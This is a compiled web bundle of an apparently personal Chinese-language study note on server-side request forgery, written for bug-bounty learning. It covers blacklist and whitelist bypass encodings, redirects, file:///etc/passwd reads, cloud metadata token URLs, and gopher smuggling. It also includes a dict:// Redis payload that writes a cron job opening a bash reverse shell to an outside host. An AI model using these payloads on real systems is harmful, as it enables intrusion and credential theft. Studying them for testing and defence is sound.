import{_ as d}from"./ValaxyMain.vue_vue_type_style_index_0_lang-DRVqeRiY.js";import{a as u,p as r,o as p,c as g,w as l,f as m,r as i,g as e,h as t}from"./app-CzjF7NIc.js";import"./YunFooter.vue_vue_type_script_setup_true_lang-17i98rOK.js";import"./YunCard.vue_vue_type_script_setup_true_lang-Da3dkqK-.js";import"./YunPageHeader.vue_vue_type_script_setup_true_lang-BsneHNVS.js";import"./index-C7yU5XnD.js";const _=e("h1",{id:"ssrf-server-side-request-forgery",tabindex:"-1"},[t("SSRF(Server-Side Request Forgery) "),e("a",{class:"header-anchor",href:"#ssrf-server-side-request-forgery","aria-label":'Permalink to "SSRF(Server-Side Request Forgery)"'},"â€‹")],-1),f=e("aside",null," ğŸ’¡ Make sure the request comes from the remote server and not your personal IP address ",-1),b=e("h2",{id:"what-is-ssrf",tabindex:"-1"},[t("What is SSRF? "),e("a",{class:"header-anchor",href:"#what-is-ssrf","aria-label":'Permalink to "What is SSRF?"'},"â€‹")],-1),k=e("p",null,"è¯±å¯¼æœåŠ¡ç«¯åº”ç”¨ç¨‹åºå»è®¿é—®ç”±æ”»å‡»è€…æ§åˆ¶çš„ä»»æ„åœ°å€,æ”»å‡»è€…èƒ½æ»¥ç”¨è¯¥åŠŸèƒ½åœ¨æœåŠ¡å™¨ä¸Šå»è¯»å–æˆ–æ›´æ–°å†…éƒ¨èµ„æº.",-1),v=e("p",null,"(requestçš„è¡Œä¸ºæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„)",-1),y=e("ul",null,[e("li",null,"Blind SSRF - Allows to scan for accessible hosts and ports"),e("li",null,"Full Response - Allows you to see the entire resposne from the server"),e("li",null,"Limited or Response - Shows a portion of the response like the title of the page or No Response or you have access to resources but canâ€™t see them directly")],-1),w=e("h3",{id:"blind-ssrf",tabindex:"-1"},[t("Blind SSRF "),e("a",{class:"header-anchor",href:"#blind-ssrf","aria-label":'Permalink to "Blind SSRF"'},"â€‹")],-1),S=e("ul",null,[e("li",null,[e("p",null,"ä½¿ç”¨SSRFæµ‹è¯•å¼€æ”¾ç«¯å£"),e("ul",null,[e("li",null,"æ ¹æ®è¿”å›æ—¶é—´åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾")])])],-1),x=e("p",null,"è¿˜å¯ä»¥ä½¿ç”¨ï¼š",-1),P=e("ul",null,[e("li",null,"Javascript"),e("li",null,"exfil data")],-1),F=e("h3",{id:"full-response",tabindex:"-1"},[t("Full Response "),e("a",{class:"header-anchor",href:"#full-response","aria-label":'Permalink to "Full Response"'},"â€‹")],-1),R=e("p",null,"ä¸å—é™åˆ¶ï¼Œç›´æ¥ä»responseä¸­è·å–åˆ°ä¿¡æ¯",-1),E=e("h3",{id:"limited-response",tabindex:"-1"},[t("Limited Response "),e("a",{class:"header-anchor",href:"#limited-response","aria-label":'Permalink to "Limited Response"'},"â€‹")],-1),T=e("p",null,"éœ€è¦è¿›è¡Œåˆ†æ",-1),q=e("h2",{id:"disclose-information",tabindex:"-1"},[t("Disclose information "),e("a",{class:"header-anchor",href:"#disclose-information","aria-label":'Permalink to "Disclose information"'},"â€‹")],-1),C=e("ol",null,[e("li",null,"ç«¯å£")],-1),B=e("ul",null,[e("li",null,[t("æµ‹è¯•ç«¯å£å‚è€ƒï¼ˆå¯ä»¥æµ‹è¿™äº›ï¼‰ "),e("ul",null,[e("li",null,"21, (FTP)"),e("li",null,"22, (SSH)"),e("li",null,"80, (Web)"),e("li",null,"443, (SSL Web)"),e("li",null,"8080, (Proxy)")])])],-1),I=e("ol",{start:"2"},[e("li",null,"å…è®¸çš„åè®®ï¼š")],-1),L=e("ul",null,[e("li",null,"gopher:// (File Distribution)"),e("li",null,"dict:// ( dictionary network protocol)"),e("li",null,"ftp://Â (File Transfer Protocol)"),e("li",null,"File:// (File URI Scheme)"),e("li",null,"ldap:// ( Lightweight Directory Access Protocol*)*")],-1),A=e("ol",{start:"3"},[e("li",null,"çœŸå®ipåœ°å€ï¼š")],-1),D=e("ul",null,[e("li",null,"é€šè¿‡responseçš„å¤´éƒ¨æˆ–å…¶ä»–è¾“å‡º")],-1),M=e("ol",{start:"4"},[e("li",null,"å…¶ä»–ä¿¡æ¯æ³„æ¼æ–¹å¼ï¼ˆæ”¶é›†ä¸­ï¼‰")],-1),U=e("ul",null,[e("li",null,[t("use incomplete HTTP protocol ï¼ˆ "),e("a",{href:"https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a",target:"_blank",rel:"noreferrer"},"https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a"),t(" ï¼‰ "),e("ul",null,[e("li",null,[e("a",{href:"https://infosecwriteups.com/%5B::%5D.",target:"_blank",rel:"noreferrer"},"http://[::]")]),e("li",null,"http://")])])],-1),W=e("h2",{id:"make-sure-request-comes-from-the-remote-server",tabindex:"-1"},[t("Make sure request comes from the remote server "),e("a",{class:"header-anchor",href:"#make-sure-request-comes-from-the-remote-server","aria-label":'Permalink to "Make sure request comes from the remote server"'},"â€‹")],-1),$=e("h3",{id:"ä½¿ç”¨nc",tabindex:"-1"},[t("ä½¿ç”¨nc "),e("a",{class:"header-anchor",href:"#ä½¿ç”¨nc","aria-label":'Permalink to "ä½¿ç”¨nc"'},"â€‹")],-1),H=e("p",null,"å¦‚æœç›‘å¬åˆ°çš„ipåœ°å€éæœ¬åœ°,è¯æ˜è¯·æ±‚æ˜¯ä»æœ¬åœ°æµè§ˆå™¨å‘èµ·çš„",-1),G=e("p",null,"å‘½ä»¤:",-1),j=e("div",{class:"language-jsx vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"jsx"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nc "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"lvp "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"8000")])])]),e("button",{class:"collapse"})],-1),N=e("h3",{id:"ä½¿ç”¨burpsuite",tabindex:"-1"},[t("ä½¿ç”¨Burpsuite "),e("a",{class:"header-anchor",href:"#ä½¿ç”¨burpsuite","aria-label":'Permalink to "ä½¿ç”¨Burpsuite"'},"â€‹")],-1),z=e("aside",null," ğŸ’¡ åœ¨blind ssrfä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨burp ",-1),J=e("p",null,"Step 1:ä½¿ç”¨burpä¸‹â€burp collaborator clientâ€,ç„¶åå°†åœ°å€å¤åˆ¶åˆ°ssrfä½ç½®",-1),O=e("p",null,"Step 2: æŸ¥çœ‹collaborator client ä¸‹çš„history æ˜¯å¦æ˜¯æœ¬åœ°ipåœ°å€",-1),X=e("h2",{id:"bypass-blacklist",tabindex:"-1"},[t("Bypass Blacklist "),e("a",{class:"header-anchor",href:"#bypass-blacklist","aria-label":'Permalink to "Bypass Blacklist"'},"â€‹")],-1),Q=e("h3",{id:"fooling-it-with-redirects",tabindex:"-1"},[t("Fooling it with redirects "),e("a",{class:"header-anchor",href:"#fooling-it-with-redirects","aria-label":'Permalink to "Fooling it with redirects"'},"â€‹")],-1),V=e("p",null,"For example, you can host a file with the following content on your web server:",-1),Z=e("div",{class:"language-html vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"html"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#B31D28","--shiki-dark":"#FDAEB7","--shiki-light-font-style":"italic","--shiki-dark-font-style":"italic"}},"<"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},'?php header(â€œlocation: http://127.0.0.1"); ?>')])])]),e("button",{class:"collapse"})],-1),Y=e("p",null,[t("Letâ€™s say this file is hosted atÂ "),e("em",null,"http:"),t("//"),e("em",null,"attacker.com/redirect.php"),t(" . This way, when you make the target server requestÂ "),e("em",null,"http:"),t("//"),e("em",null,"attacker.com/redirect.php"),t(", the target server is actually redirected to "),e("a",{href:"http://127.0.0.1",target:"_blank",rel:"noreferrer"},"http://127.0.0.1"),t(", a restricted internal address.")],-1),K=e("p",null,"å¤‡æ³¨ï¼š",-1),ee=e("ul",null,[e("li",null,[t("å³ä½¿æ²¡æœ‰åŠæ³•bypassï¼Œä¹Ÿå¯ä»¥å°è¯•æµ‹ä¿¡é“æ”»å‡»ï¼Œçœ‹responseçš„å¤´éƒ¨æ˜¯å¦åŒ…å«å†…éƒ¨çš„ipåœ°å€ï¼Œä¾‹å¦‚ "),e("code",null,"X-Forwarded-For")])],-1),te=e("h3",{id:"tricking-it-with-dns",tabindex:"-1"},[t("Tricking it with DNS "),e("a",{class:"header-anchor",href:"#tricking-it-with-dns","aria-label":'Permalink to "Tricking it with DNS"'},"â€‹")],-1),le=e("p",null,"Modify the A/AAAA record of a domain you control and make it point to internal addresses of the victimâ€™s network.",-1),se=e("p",null,"ç½‘ç«™:",-1),ie=e("ul",null,[e("li",null,[e("a",{href:"http://xip.io",target:"_blank",rel:"noreferrer"},"xip.io"),t(" (å¥½åƒä¸èƒ½ç”¨äº†)")]),e("li",null,[e("a",{href:"https://nip.io/",target:"_blank",rel:"noreferrer"},"https://nip.io/")]),e("li",null,[e("a",{href:"https://sslip.io/",target:"_blank",rel:"noreferrer"},"https://sslip.io/"),t(" (å—xip.ioçš„ å¯å‘)")]),e("li",null,[e("a",{href:"https://v2ex.com/t/863767",target:"_blank",rel:"noreferrer"},"https://v2ex.com/t/863767"),t(" v2exä¸Šæœ‰äººçš„å¸–å­,CNAMEæŒ‡å‘äº†æœ¬åœ°")])],-1),ne=e("h3",{id:"using-ipv6-addresses",tabindex:"-1"},[t("Using IPv6 addresses "),e("a",{class:"header-anchor",href:"#using-ipv6-addresses","aria-label":'Permalink to "Using IPv6 addresses"'},"â€‹")],-1),oe=e("p",null,"Try using IPv6 addresses instead of IPv4. The protection mechanisms implemented for IPv4 might not have been implemented for IPv6.",-1),ae=e("h3",{id:"switching-out-the-encoding",tabindex:"-1"},[t("Switching out the encoding "),e("a",{class:"header-anchor",href:"#switching-out-the-encoding","aria-label":'Permalink to "Switching out the encoding"'},"â€‹")],-1),re=e("p",null,"There are many different ways of encoding a URL or an address that doesnâ€™t change how a server interprets its location, but might let it slip under the radar of a blacklist. These include hex encoding, octal encoding, dword encoding, URL encoding, and mixed encoding.",-1),ce=e("ul",null,[e("li",null,"Hex Encoding")],-1),he=e("p",null,"Turns out that servers out there can understand IP addresses when they are hex encoded.Hereâ€™s an example:",-1),de=e("div",{class:"language-html vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"html"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"127.0.0.1 translates to 0x7f.0x0.0x0.0x1")])])]),e("button",{class:"collapse"})],-1),ue=e("p",null,[e("strong",null,"The â€œ0xâ€ at the beginning of each section designates it as a hex number.")],-1),pe=e("p",null,"â€¢ Octal Encoding",-1),ge=e("p",null,"Octal encoding is a way of representing characters in the base 8 format.For example,",-1),me=e("div",{class:"language-html vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"html"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"127.0.0.1 translates to 0177.0.0.01")])])]),e("button",{class:"collapse"})],-1),_e=e("p",null,"In this case, the leading zeros are necessary to convey that that section is an octal number.",-1),fe=e("p",null,"â€¢ Dword Encoding",-1),be=e("p",null,"â€œDwordâ€ stands for â€œdouble wordâ€, which is a 32-bit integer.An IP address is basically a 32-bit number,split into four octets (groups of eight bits),and written in the decimal format(groups of eight bits).",-1),ke=e("p",null,"how to get dword format IP address",-1),ve=e("p",null,"For example, 127.0.0.1 is actually the decimal representation of 01111111.00000000.00000000.00000001â€¦ And when we translate the entire number(01111111000000000000000000000001) into one single decimal number, we get the IP address in dword format!",-1),ye=e("p",null,[t("So what is 127.0.0.1 in dword? Itâ€™s the answer for 127"),e("em",null,"256Â³+0"),t("256Â²+0"),e("em",null,"256Â¹+1"),t("256â°, which is 2130706433,Meaning that if you type in "),e("a",{href:"http://127.0.0.1/",target:"_blank",rel:"noreferrer"},"http://2130706433"),t(" instead of "),e("a",{href:"http://127.0.0.1/",target:"_blank",rel:"noreferrer"},"http://127.0.0.1"),t(", it would still be understood! Pretty cool right?")],-1),we=e("ul",null,[e("li",null,"URL Encoding")],-1),Se=e("p",null,"For example, the word â€œlocalhostâ€ can be represented with its URL encoded equivalent, â€œ%6c%6f%63%61%6c%68%6f%73%74â€.So when a server is blocking requests to internal hostnames such as â€œlocalhostâ€, try itâ€™s URL encoded equivalent!",-1),xe=e("ul",null,[e("li",null,"Mixed Encoding")],-1),Pe=e("p",null,"Itâ€™s mix-and-match time!You could also use a combination of encoding techniques to try to fool the server: maybe this would work?",-1),Fe=e("div",{class:"language-html vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"html"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"127.0.0.1 translates to 0177.0.0.0x1")])])]),e("button",{class:"collapse"})],-1),Re=e("p",null,[t("æ›´å¤šå¯ä»¥çœ‹è¿™é‡Œ: "),e("a",{href:"https://h.43z.one/ipconverter/",target:"_blank",rel:"noreferrer"},"https://h.43z.one/ipconverter/")],-1),Ee=e("h2",{id:"bypass-whitelists",tabindex:"-1"},[t("Bypass Whitelists "),e("a",{class:"header-anchor",href:"#bypass-whitelists","aria-label":'Permalink to "Bypass Whitelists"'},"â€‹")],-1),Te=e("p",null,"Whitelists are generally harder to bypass because they are by default, stricter than blacklists.",-1),qe=e("h3",{id:"open-redirect",tabindex:"-1"},[t("open redirect "),e("a",{class:"header-anchor",href:"#open-redirect","aria-label":'Permalink to "open redirect"'},"â€‹")],-1),Ce=e("p",null,"But it is possible if there is an open redirect vulnerability within the whitelisted domains.If you could find an open redirect, you can request a whitelisted URL that redirects to an internal URL.",-1),Be=e("h3",{id:"not-correctly-implemented",tabindex:"-1"},[t("not correctly implemented "),e("a",{class:"header-anchor",href:"#not-correctly-implemented","aria-label":'Permalink to "not correctly implemented"'},"â€‹")],-1),Ie=e("p",null,"eg. via poorly designed regex",-1),Le=e("p",null,[t("it could also be bypassed by using making a subdomain or directory as the whitelisted domain name (eg.Â "),e("em",null,"victim.com.attacker.com"),t(" Â orÂ "),e("em",null,"attacker.com/victim.com"),t(" ).")],-1),Ae=e("h2",{id:"åè®®çš„ä½¿ç”¨",tabindex:"-1"},[t("åè®®çš„ä½¿ç”¨ "),e("a",{class:"header-anchor",href:"#åè®®çš„ä½¿ç”¨","aria-label":'Permalink to "åè®®çš„ä½¿ç”¨"'},"â€‹")],-1),De=e("aside",null," ğŸ’¡ æ³¨æ„ï¼šä¸€äº›æƒ…å†µä¸‹ã€‚ä» BP é‡Œé¢æŠ“åŒ…è¯·æ±‚çš„è¯ï¼Œç©ºæ ¼å¾—å†™æˆ`%2520` ï¼Œå³ä¸¤æ¬¡ URL ç¼–ç æ‰å¯ä»¥é¡ºåˆ©æ‰§è¡Œ ",-1),Me=e("ul",null,[e("li",null,"gopher:// (File Distribution)"),e("li",null,"dict:// ( dictionary network protocol)"),e("li",null,"ftp://Â (File Transfer Protocol)"),e("li",null,"File:// (File URI Scheme)"),e("li",null,"ldap:// ( Lightweight Directory Access Protocol*)*")],-1),Ue=e("p",null,"å¦‚æœæ˜¯åŸºäºé”™è¯¯çš„ssrfï¼Œå¯ä»¥å…ˆæ ¹æ®responseåˆ¤æ–­æ”¯æŒå“ªäº›åè®®",-1),We=e("h3",{id:"fileåè®®ä¸‹",tabindex:"-1"},[t("fileåè®®ä¸‹ï¼š "),e("a",{class:"header-anchor",href:"#fileåè®®ä¸‹","aria-label":'Permalink to "fileåè®®ä¸‹ï¼š"'},"â€‹")],-1),$e=e("ul",null,[e("li",null,[e("code",null,"file:///etc/passwd")]),e("li",null,[e("code",null,"file:///etc/hosts"),t(" : è·å–æœ¬æœºå†…ç½‘ipåœ°å€ä¿¡æ¯ï¼Œä»è€Œç¡®è®¤å½“å‰èµ„äº§ç½‘æ®µä¿¡æ¯")]),e("li",null,[e("code",null,"[file://proc/net/arp](file://proc/net/arp)"),t(" or "),e("code",null,"[file://etc/network/interfaces](file://etc/network/interfaces)"),t(" ï¼šå½“å‰æœºå­ç½‘ç»œæƒ…å†µ")])],-1),He=e("h3",{id:"dictåè®®",tabindex:"-1"},[t("DICTåè®® "),e("a",{class:"header-anchor",href:"#dictåè®®","aria-label":'Permalink to "DICTåè®®"'},"â€‹")],-1),Ge=e("p",null,[e("strong",null,"dictåè®®æ˜¯ä»€ä¹ˆ?")],-1),je=e("p",null,[e("a",{href:"https://blog.51cto.com/u_15127673/4130760",target:"_blank",rel:"noreferrer"},"https://blog.51cto.com/u_15127673/4130760")],-1),Ne=e("p",null,[e("strong",null,"dictåè®®å¯ä»¥ç”¨æ¥åšä»€ä¹ˆ?")],-1),ze=e("ul",null,[e("li",null,"æ¢æµ‹ç«¯å£å¼€æ”¾æœåŠ¡"),e("li",null,"æ”»å‡»æœªæˆæƒçš„RedisæœåŠ¡")],-1),Je=e("p",null,[e("strong",null,"æ¢æµ‹ç«¯å£å¼€æ”¾æœåŠ¡")],-1),Oe=e("p",null,"ä½¿ç”¨ssrfé…åˆDICTåè®®æ¢æµ‹å†…ç½‘ç«¯å£å¼€æ”¾æƒ…å†µ:",-1),Xe=e("p",null,"ä¹Ÿå¯ä½¿ç”¨httpåè®®",-1),Qe=e("p",null,[e("strong",null,"ä½¿ç”¨dictåè®®æ„é€ åå¼¹shell - redis")],-1),Ve=e("p",null,[e("a",{href:"https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-2",target:"_blank",rel:"noreferrer"},"https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-2")],-1),Ze=e("div",{class:"language-txt vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"txt"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",null,"# æ¸…ç©º key")]),t(`
`),e("span",{class:"line"},[e("span",null,"dict://172.72.23.27:6379/flushall")]),t(`
`),e("span",{class:"line"},[e("span")]),t(`
`),e("span",{class:"line"},[e("span",null,"# è®¾ç½®è¦æ“ä½œçš„è·¯å¾„ä¸ºå®šæ—¶ä»»åŠ¡ç›®å½•")]),t(`
`),e("span",{class:"line"},[e("span",null,"dict://172.72.23.27:6379/config set dir /var/spool/cron/")]),t(`
`),e("span",{class:"line"},[e("span")]),t(`
`),e("span",{class:"line"},[e("span",null,"# åœ¨å®šæ—¶ä»»åŠ¡ç›®å½•ä¸‹åˆ›å»º root çš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶")]),t(`
`),e("span",{class:"line"},[e("span",null,"dict://172.72.23.27:6379/config set dbfilename root")]),t(`
`),e("span",{class:"line"},[e("span")]),t(`
`),e("span",{class:"line"},[e("span",null,"# å†™å…¥ Bash åå¼¹ shell çš„ payload")]),t(`
`),e("span",{class:"line"},[e("span",null,'dict://172.72.23.27:6379/set x "\\n* * * * * /bin/bash -i >%26 /dev/tcp/x.x.x.x/2333 0>%261\\n"')]),t(`
`),e("span",{class:"line"},[e("span")]),t(`
`),e("span",{class:"line"},[e("span",null,"# ä¿å­˜ä¸Šè¿°æ“ä½œ")]),t(`
`),e("span",{class:"line"},[e("span",null,"dict://172.72.23.27:6379/save")])])]),e("button",{class:"collapse"})],-1),Ye=e("h3",{id:"gopheråè®®",tabindex:"-1"},[t("Gopheråè®® "),e("a",{class:"header-anchor",href:"#gopheråè®®","aria-label":'Permalink to "Gopheråè®®"'},"â€‹")],-1),Ke=e("p",null,[e("strong",null,"ä¸ºä»€ä¹ˆè¦ç”¨åˆ°gopheråè®®")],-1),et=e("p",null,"![Untitled](file:///tmp/Export-123bd238-d0e8-4c85-84f8-40e1fbe1d23a/SSRF(Server-Side%20Request%20Forgery)%208896444a46f64714b2a3d272739d77b6/Untitled%205.png?msec=1669820820598)",-1),tt=e("p",null,"è¿™é‡Œæ˜¯ç”¨åˆ°gopheråè®®ä¼ é€’HTTPçš„POSTè¯·æ±‚(SSRFæ¼æ´æ— æ³•ç›´æ¥å‘èµ·POSTè¯·æ±‚)",-1),lt=e("p",null,[e("strong",null,"æ„é€ è¯·æ±‚åŒ…")],-1),st=e("p",null,"step1: æŠ“å–è¯·æ±‚åŒ…",-1),it=e("p",null,"step2: åˆ é™¤HTTPè¯·æ±‚çš„",-1),nt=e("div",{class:"language-txt vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"txt"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",null,"Accept-Encoding: gzip, deflate")])])]),e("button",{class:"collapse"})],-1),ot=e("p",null,"step3: urlä¸¤æ¬¡ç¼–ç æ•´ä¸ªpostè¯·æ±‚",-1),at=e("figure",null,[e("img",{src:"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_11/Untitled%206.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),rt=e("p",null,"step4: å°†ç¼–ç åçš„è¯·æ±‚ä½œä¸ºTCPæ•°æ®æµä¼ å…¥gopherè¯·æ±‚ä¸­:",-1),ct=e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",null,"url=gopher://172.72.23.24:80/<ä¸¤æ¬¡urlç¼–ç çš„TCPæ•°æ®æµ>")])])]),e("button",{class:"collapse"})],-1),ht=e("p",null,"step5: æˆåŠŸæ‰§è¡Œå‘½ä»¤",-1),dt=e("p",null,"åœºæ™¯:",-1),ut=e("ul",null,[e("li",null,"è€ƒè™‘fileåè®®ç»“åˆXXEå¤–éƒ¨å®ä½“æ³¨å…¥,å®ç°ssrf"),e("li",null,"ssrf å‡çº§ä¸ºRCE(é€šè¿‡mysql)")],-1),pt=e("h2",{id:"proof",tabindex:"-1"},[t("Proof "),e("a",{class:"header-anchor",href:"#proof","aria-label":'Permalink to "Proof"'},"â€‹")],-1),gt=e("p",null,"ç‰¹å¾å¯å‚è€ƒ: å„ç§äº‘æœåŠ¡å™¨/ä¸­é—´ä»¶ [ ä¸ªäººnotionç¬”è®° æˆ‘blogæ²¡æœ‰æ›´å˜»å˜»]",-1),mt=e("h3",{id:"aws",tabindex:"-1"},[t("AWS "),e("a",{class:"header-anchor",href:"#aws","aria-label":'Permalink to "AWS"'},"â€‹")],-1),_t=e("ul",null,[e("li",null,"http://{your-ip}/metadata/v1"),e("li",null,"http://{your-ip}/latest/metadata")],-1),ft=e("h3",{id:"google-gcp",tabindex:"-1"},[t("Google GCP "),e("a",{class:"header-anchor",href:"#google-gcp","aria-label":'Permalink to "Google GCP"'},"â€‹")],-1),bt=e("ul",null,[e("li",null,[e("a",{href:"http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",target:"_blank",rel:"noreferrer"},"http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token")])],-1),kt=e("h2",{id:"escalate-to-rce",tabindex:"-1"},[t("escalate to RCE "),e("a",{class:"header-anchor",href:"#escalate-to-rce","aria-label":'Permalink to "escalate to RCE"'},"â€‹")],-1),vt=e("h3",{id:"aws-1",tabindex:"-1"},[t("AWS "),e("a",{class:"header-anchor",href:"#aws-1","aria-label":'Permalink to "AWS"'},"â€‹")],-1),yt=e("p",null,"å‚è€ƒAWSä¸‹çš„ ,å†™çš„å¾ˆè¯¦ç»†ã€‚è²Œä¼¼ä»æˆ‘ä¸ªäººç¬”è®°æ¬è¿åˆ°blogé‡Œäº†ï¼Œå¯ä»¥å‚è€ƒé‚£ä¸€ç¯‡=-=",-1),wt=e("h3",{id:"mysql",tabindex:"-1"},[t("MySQL "),e("a",{class:"header-anchor",href:"#mysql","aria-label":'Permalink to "MySQL"'},"â€‹")],-1),St=e("p",null,"ä¸æƒ³æ¬è¿ã€‚ã€‚ã€‚ä¹Ÿæ˜¯notionç¬”è®°æœ‰å†™ã€‚blogæ”¹æ’ç‰ˆï¼Œç´¯ã€‚",-1),xt=e("h2",{id:"å‡ºç°çš„åœ°æ–¹æ€»ç»“",tabindex:"-1"},[t("å‡ºç°çš„åœ°æ–¹æ€»ç»“ "),e("a",{class:"header-anchor",href:"#å‡ºç°çš„åœ°æ–¹æ€»ç»“","aria-label":'Permalink to "å‡ºç°çš„åœ°æ–¹æ€»ç»“"'},"â€‹")],-1),Pt=e("ul",null,[e("li",null,[t("urlé‡Œç”¨base64ç¼–ç ï¼ˆ"),e("a",{href:"https://blog.neolex.dev/13/",target:"_blank",rel:"noreferrer"},"ä¾‹å­"),t("ï¼‰")]),e("li",null,"Any customization that involves HTML/CSS (Font name, colors, styling)"),e("li",null,"pushed to the PDF( PDF+XSS ==SSRF)")],-1),Ft=e("h2",{id:"reference",tabindex:"-1"},[t("Reference "),e("a",{class:"header-anchor",href:"#reference","aria-label":'Permalink to "Reference"'},"â€‹")],-1),Rt=e("p",null,"Udemy",-1),Et=e("ul",null,[e("li",null,[e("a",{href:"https://www.udemy.com/course/intro-to-bug-bounty-by-nahamsec/learn/lecture/24998004#overview",target:"_blank",rel:"noreferrer"},"https://www.udemy.com/course/intro-to-bug-bounty-by-nahamsec/learn/lecture/24998004#overview")])],-1),Tt=e("p",null,"Medium",-1),qt=e("ul",null,[e("li",null,[e("a",{href:"https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b",target:"_blank",rel:"noreferrer"},"https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b")]),e("li",null,[e("a",{href:"https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a",target:"_blank",rel:"noreferrer"},"https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a")])],-1),Ct=e("p",null,"PPT",-1),Bt=e("ul",null,[e("li",null,[t("Google doc "),e("ul",null,[e("li",null,[e("a",{href:"https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent",target:"_blank",rel:"noreferrer"},"https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent")])])])],-1),Gt={__name:"shen-ru-qian-chu-ssrf-wo-de-xue-xi-bi-ji",setup(It,{expose:c}){const n=JSON.parse('{"title":"æ·±å…¥æµ…å‡ºSSRFï¼ˆä¸€ï¼‰ ï¼š æˆ‘çš„å­¦ä¹ ç¬”è®°","description":"","frontmatter":{"title":"æ·±å…¥æµ…å‡ºSSRFï¼ˆä¸€ï¼‰ ï¼š æˆ‘çš„å­¦ä¹ ç¬”è®°","date":"2022-11-30T23:17:15.000Z","tags":["SSRF","ç¬”è®°"],"published":true,"hideInList":false,"feature":null,"isTop":false},"headers":[{"level":2,"title":"What is SSRF?","slug":"what-is-ssrf","link":"#what-is-ssrf","children":[{"level":3,"title":"Blind SSRF","slug":"blind-ssrf","link":"#blind-ssrf","children":[]},{"level":3,"title":"Full Response","slug":"full-response","link":"#full-response","children":[]},{"level":3,"title":"Limited Response","slug":"limited-response","link":"#limited-response","children":[]}]},{"level":2,"title":"Disclose information","slug":"disclose-information","link":"#disclose-information","children":[]},{"level":2,"title":"Make sure request comes from the remote server","slug":"make-sure-request-comes-from-the-remote-server","link":"#make-sure-request-comes-from-the-remote-server","children":[{"level":3,"title":"ä½¿ç”¨nc","slug":"ä½¿ç”¨nc","link":"#ä½¿ç”¨nc","children":[]},{"level":3,"title":"ä½¿ç”¨Burpsuite","slug":"ä½¿ç”¨burpsuite","link":"#ä½¿ç”¨burpsuite","children":[]}]},{"level":2,"title":"Bypass Blacklist","slug":"bypass-blacklist","link":"#bypass-blacklist","children":[{"level":3,"title":"Fooling it with redirects","slug":"fooling-it-with-redirects","link":"#fooling-it-with-redirects","children":[]},{"level":3,"title":"Tricking it with DNS","slug":"tricking-it-with-dns","link":"#tricking-it-with-dns","children":[]},{"level":3,"title":"Using IPv6 addresses","slug":"using-ipv6-addresses","link":"#using-ipv6-addresses","children":[]},{"level":3,"title":"Switching out the encoding","slug":"switching-out-the-encoding","link":"#switching-out-the-encoding","children":[]}]},{"level":2,"title":"Bypass Whitelists","slug":"bypass-whitelists","link":"#bypass-whitelists","children":[{"level":3,"title":"open redirect","slug":"open-redirect","link":"#open-redirect","children":[]},{"level":3,"title":"not correctly 